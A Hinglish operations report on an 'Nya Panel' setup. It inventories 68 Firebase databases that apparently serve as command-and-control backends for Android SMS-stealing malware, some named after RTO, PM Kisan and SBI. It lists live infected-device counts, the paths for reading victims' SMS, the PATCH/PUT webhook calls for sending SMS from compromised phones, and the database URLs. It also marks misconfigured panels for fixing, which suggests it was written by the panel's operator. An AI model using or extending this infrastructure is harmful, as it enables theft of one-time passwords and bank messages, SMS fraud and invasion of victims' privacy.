# Firebase Full Report — Nya Panel

**Date:** 2026-08-13 | **Total:** 68 Firebase | **Live abhi:** 34 | **Dead/Locked:** 34

## Kyun har update ke baad list alag dikhti hai?

**Root cause:** Panel me `preferredDeviceNode` galat set hai **14 Firebase** par. Fast load pehle galat node fetch karta hai, background me sahi node milta hai — isliye devices baad me badal jate hain.

Example: **Nya Panel** — panel config `clients` hai, lekin live devices **`devices` node** me hain (20 devices).

---

## SMS Read — 3 Common Patterns

| Pattern | Path | Kaun use karta hai |
|---------|------|-------------------|
| **Nya/APK style** | `messages/{deviceId}` | nyapanel.apk, RTO WEB, most clients-node panels |
| **RTO/Rabel style** | `user_sms/{deviceId}` | user_list, user_data panels |
| **Nested style** | `{node}/{deviceId}/all_sms` | SpinPlay, kuch All_Users panels |

## SMS Send — 3 Common Patterns

| Pattern | Method | Example Firebase |
|---------|--------|------------------|
| **Nya APK** | `PATCH clients/{id}` + `PUT clients/{id}/webhookEvent/sendSms` | hdjdjdj (Nya Panel) |
| **RTO/Rabel** | `PATCH user_list/{id}` or `user_data/{id}` + webhookEvent | rto9, demon, chalo |
| **Shoot/Verify** | `PUT Verify_Device/{id}/webhookEvent/sendSms` | dev-rahul, Shoot Admin |

---

## LIVE Firebase (34) — Abhi devices hain

| Devices | Device Node | SMS Path | Send | Name | Panel Config | Match? |
|---------|-------------|----------|------|------|--------------|--------|
| 20 | `devices` | `messages/3e9d19caa6305a43` | PATCH clients/{id} + PUT clients/{id}/we | Nya Panel (194) | `clients` | ❌ clients |
| 20 | `user_list` | `user_sms/698d3344acba5395` | PATCH user_list/{id} + PUT webhookEvent/ | RTO WEB_7 (27) | `user_list` | ✅ |
| 20 | `user_data` | `messages/{id}` | PATCH user_data/{id} + PUT webhookEvent/ | DEMON rto (1) (59) | `user_list` | ❌ user_list |
| 19 | `clients` | `messages/ecb5cf984e1e610e` | PATCH clients/{id} + PUT clients/{id}/we | Jaduopop A9A12 (19) | `clients` | ✅ |
| 18 | `user_data` | `messages/2b96927f4ec945cf` | PATCH user_data/{id} + PUT webhookEvent/ | Maxbhai B8D3A (25) | `clients` | ❌ clients |
| 17 | `user_data` | `messages/fdc9c5fde504f77e` | PATCH user_data/{id} + PUT webhookEvent/ | Miyakhalifa 143D5 (17) | `clients` | ❌ clients |
| 17 | `clients` | `messages/62e2a0bc6ad20073` | PATCH clients/{id} + PUT clients/{id}/we | Fyyffyyf 60A54 (15) | `clients` | ✅ |
| 16 | `user_data` | `user_sms/f6259a291003710c` | PATCH user_data/{id} + PUT webhookEvent/ | Samar Admin 13_1.0 (44) | `user_list` | ❌ user_list |
| 16 | `clients` | `messages/841d7da820d2c7d7` | PATCH clients/{id} + PUT clients/{id}/we | Dharmesh Panel (16) | `clients` | ✅ |
| 15 | `clients` | `messages/f729abd315147c58` | PATCH clients/{id} + PUT clients/{id}/we | Rajputlodu 5Bed0 (15) | `clients` | ✅ |
| 15 | `user_list` | `user_sms/629d12d842c41970` | PATCH user_list/{id} + PUT webhookEvent/ | RTO Admin3 (1) (15) | `user_list` | ✅ |
| 12 | `users` | `messages/{id}` | PATCH clients/{id} + PUT clients/{id}/we | RTO Admin 2 (49) | `user_list` | ❌ user_list |
| 12 | `user_data` | `user_sms/85c9068daf279f2c` | PATCH user_data/{id} + PUT webhookEvent/ | Master Admin 36 (3) (39) | `clients` | ❌ clients |
| 11 | `clients` | `messages/167758d1923b8d1e` | PATCH clients/{id} + PUT clients/{id}/we | Shadow F9Cd3 (18) | `clients` | ✅ |
| 10 | `user_data` | `messages/{id}` | PATCH user_data/{id} + PUT webhookEvent/ | PM ADMIN RAJ (23) | `user_list` | ❌ user_list |
| 10 | `clients` | `messages/0250a4e1bb9d5a0a` | PATCH clients/{id} + PUT clients/{id}/we | Mparirajkumar (10) | `clients` | ✅ |
| 10 | `clients` | `messages/{id}` | PATCH clients/{id} + PUT clients/{id}/we | Rmx3511Uuj (10) | `clients` | ✅ |
| 8 | `All_Users` | `messages/{id}` | PATCH clients/{id} + PUT clients/{id}/we | Spy fixed (25) | `users` | ❌ users |
| 8 | `clients` | `messages/b83ccd5b3e7db34d` | PATCH clients/{id} + PUT clients/{id}/we | Jsjdj7374J (8) | `clients` | ✅ |
| 8 | `Verify_Device` | `messages/{id}` | Verify_Device/{id}/webhookEvent/sendSms  | base (3) (8) | `Verify_Device` | ✅ |
| 8 | `user_data` | `messages/{id}` | PATCH user_data/{id} + PUT webhookEvent/ | base (1) (2) (43) | `user_list` | ❌ user_list |
| 5 | `clients` | `messages/8f7a937b082f0c88` | PATCH clients/{id} + PUT clients/{id}/we | Anjali 4A4Bc (5) | `clients` | ✅ |
| 5 | `clients` | `messages/7283406c6713e16d` | PATCH clients/{id} + PUT clients/{id}/we | Sappu E8D46 (5) | `clients` | ✅ |
| 4 | `clients` | `messages/4557023f25264ed8` | PATCH clients/{id} + PUT clients/{id}/we | Devil King 101D4 (4) | `clients` | ✅ |
| 4 | `user_data` | `user_sms/68b8c865bc485a67` | PATCH user_data/{id} + PUT webhookEvent/ | SBI ADMIN (4) | `user_data` | ✅ |
| 4 | `clients` | `messages/298b9e8d819c1106` | PATCH clients/{id} + PUT clients/{id}/we | Shuruwat Admin (4) | `clients` | ✅ |
| 3 | `clients` | `messages/5d05751c0849dddd` | PATCH clients/{id} + PUT clients/{id}/we | Suman Penal (3) | `clients` | ✅ |
| 2 | `All_Users` | `messages/{id}` | PATCH clients/{id} + PUT clients/{id}/we | Customer 1B7Ca (137) | `clients` | ❌ clients |
| 2 | `user_list` | `messages/{id}` | PATCH user_list/{id} + PUT webhookEvent/ | RTO Admin (2) | `user_list` | ✅ |
| 1 | `All_Users` | `messages/{id}` | PATCH clients/{id} + PUT clients/{id}/we | RTO Admin 31_1.0 (152) | `user_list` | ❌ user_list |
| 1 | `All_Users` | `messages/{id}` | PATCH clients/{id} + PUT clients/{id}/we | 50k-Vid-Payload[sumdi] (1 | `clients` | ❌ clients |
| 1 | `clients` | `clients/4f2f4608ffa77c91/all_sms` | PATCH clients/{id} + PUT clients/{id}/we | God8 Chatee (2) | `clients` | ✅ |
| 1 | `users` | `messages/{id}` | PATCH users/{id} + PUT webhookEvent/send | base (1) (3) (1) (751) | `user_list` | ❌ user_list |
| 1 | `clients` | `messages/a325c326d89b837e` | PATCH clients/{id} + PUT clients/{id}/we | Rtoo 6C8E6 (1) | `clients` | ✅ |

## Panel Config GALAT (14) — Fix zaroori

- **Nya Panel (194)** (20 devices): panel=`clients` → sahi=`devices` | SMS: `messages/3e9d19caa6305a43`
- **DEMON rto (1) (59)** (20 devices): panel=`user_list` → sahi=`user_data` | SMS: `messages/{id}`
- **Maxbhai B8D3A (25)** (18 devices): panel=`clients` → sahi=`user_data` | SMS: `messages/2b96927f4ec945cf`
- **Miyakhalifa 143D5 (17)** (17 devices): panel=`clients` → sahi=`user_data` | SMS: `messages/fdc9c5fde504f77e`
- **Samar Admin 13_1.0 (44)** (16 devices): panel=`user_list` → sahi=`user_data` | SMS: `user_sms/f6259a291003710c`
- **RTO Admin 2 (49)** (12 devices): panel=`user_list` → sahi=`users` | SMS: `messages/{id}`
- **Master Admin 36 (3) (39)** (12 devices): panel=`clients` → sahi=`user_data` | SMS: `user_sms/85c9068daf279f2c`
- **PM ADMIN RAJ (23)** (10 devices): panel=`user_list` → sahi=`user_data` | SMS: `messages/{id}`
- **Spy fixed (25)** (8 devices): panel=`users` → sahi=`All_Users` | SMS: `messages/{id}`
- **base (1) (2) (43)** (8 devices): panel=`user_list` → sahi=`user_data` | SMS: `messages/{id}`
- **Customer 1B7Ca (137)** (2 devices): panel=`clients` → sahi=`All_Users` | SMS: `messages/{id}`
- **RTO Admin 31_1.0 (152)** (1 devices): panel=`user_list` → sahi=`All_Users` | SMS: `messages/{id}`
- **50k-Vid-Payload[sumdi] (129)** (1 devices): panel=`clients` → sahi=`All_Users` | SMS: `messages/{id}`
- **base (1) (3) (1) (751)** (1 devices): panel=`user_list` → sahi=`users` | SMS: `messages/{id}`

## APK me the lekin ab LIVE nahi (6)

- **Sexy chat (3) (524)** — APK: `devices` (524 devices) | `https://newmalll-default-rtdb.firebaseio.com`
- **Sexy chat (1) (514)** — APK: `devices` (507 devices) | `https://bakks-e3682-default-rtdb.firebaseio.com`
- **Panel New cracker (416)** — APK: `clients` (416 devices) | `https://colana-84ce2-default-rtdb.firebaseio.com`
- **Shoot Admin (353)** — APK: `Verify_Device` (352 devices) | `https://dev-rahul-3ca89-default-rtdb.firebaseio.com`
- **base (2) (1) (125)** — APK: `Verify_Device` (124 devices) | `https://nammu-325a6-default-rtdb.firebaseio.com`
- **Angle Admin (1) (1)** — APK: `messages` (1 devices) | `https://sbiclient0-default-rtdb.asia-southeast1.firebasedatabase.app`

## Dead / Kabhi devices nahi (28)

- Abhiyogi 8B07E (97) | `https://abhiyogi-8b07e-default-rtdb.firebaseio.com`
- AdminApp | `https://yourfirebasio-default-rtdb.asia-southeast1.firebasedatabase.app`
- Adsf 8B4E8 (158) | `https://adsf-8b4e8-default-rtdb.asia-southeast1.firebasedatabase.app`
- Ahisjija (100) | `https://ahisjija-default-rtdb.firebaseio.com`
- AlonExRaj-v2.1 | `https://com-app-default-rtdb.firebaseio.com`
- Amoyu Af062 (128) | `https://amoyu-af062-default-rtdb.firebaseio.com`
- Ayan 5581D (22) | `https://ayan-5581d-default-rtdb.firebaseio.com`
- C2H panel | `https://raxtyc-default-rtdb.firebaseio.com`
- Darknet AdminX | `https://gaandkiaand-default-rtdb.firebaseio.com`
- Dhumm 90A53 (44) | `https://dhumm-90a53-default-rtdb.firebaseio.com`
- HAMMER Panel 099 | `https://gghhh-35b79-default-rtdb.firebaseio.com`
- Lodaroll (149) | `https://lodaroll-default-rtdb.firebaseio.com`
- PM Awaas Admin | `https://pmkisan-4e573-default-rtdb.firebaseio.com`
- Project F2Fd6 (236) | `https://project-f2fd6-default-rtdb.firebaseio.com`
- RTO ADMIN_1.0-1-1 (1) (1) | `https://pmkisan-9fdd5-default-rtdb.firebaseio.com`
- Rajakk 80Ecd (46) | `https://rajakk-80ecd-default-rtdb.firebaseio.com`
- SEXY BABY | `https://callmebinaryy12-default-rtdb.firebaseio.com`
- Shoot Admin_1.0 2 (39) | `https://nirmalda-efc1b-default-rtdb.firebaseio.com`
- Sudhir Suexs Seox (44) | `https://sudhir-suexs-seox-default-rtdb.firebaseio.com`
- User Admin 3 (1) | `https://server-97e23-default-rtdb.firebaseio.com`
- User Admin Sb 2 fix | `https://-default-rtdb.firebaseio.com`
- VIP kittyu (1) | `https://rameshwar-7okt-default-rtdb.firebaseio.com`
- Vdgsh 623Ed (126) | `https://vdgsh-623ed-default-rtdb.firebaseio.com`
- Venom Admin Master (1) | `https://shoot-admin-default-rtdb.firebaseio.com`
- ZEN ADMIN | `https://aaaa-b3749-default-rtdb.firebaseio.com`
- base (2) (2) | `https://panel-wala-v1-default-rtdb.asia-southeast1.firebasedatabase.app`
- challan falcon (1) | `https://par1nad-default-rtdb.firebaseio.com`
- fixed AI RTO Admin 9 (1) | `https://rto91-2b27f-default-rtdb.firebaseio.com`